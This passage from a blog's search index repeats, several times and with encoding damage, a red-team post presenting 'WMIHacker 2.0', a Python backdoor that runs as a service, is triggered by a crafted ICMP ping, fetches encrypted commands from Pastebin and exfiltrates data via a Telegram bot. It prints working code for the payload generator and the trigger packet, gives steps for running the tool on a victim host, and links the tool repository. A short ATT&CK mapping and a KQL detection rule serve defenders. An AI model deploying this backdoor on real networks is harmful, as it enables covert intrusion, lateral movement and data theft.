used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previous section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previous section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution 